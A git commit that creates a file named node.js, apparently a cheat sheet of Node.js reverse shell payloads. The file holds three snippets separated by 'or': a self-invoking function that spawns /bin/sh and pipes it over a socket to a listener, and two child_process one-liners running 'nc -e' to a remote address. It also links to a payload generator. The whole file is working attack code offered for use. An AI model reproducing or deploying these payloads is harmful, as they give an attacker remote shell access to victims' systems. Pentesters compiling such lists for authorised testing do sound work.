ca89f37b011fd3ff39d7512c514413dd5cc7ec9e
El Mehdi Chbani <111459230+ElMehdi-Chbani@users.noreply.github.com>
2023-10-05 12:19:33 +0100

    Create node.js

---
+++ node.js
@@ -0,0 +1,26 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "127.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+
+or
+
+require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')
+
+or
+
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')
+
+or
+
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
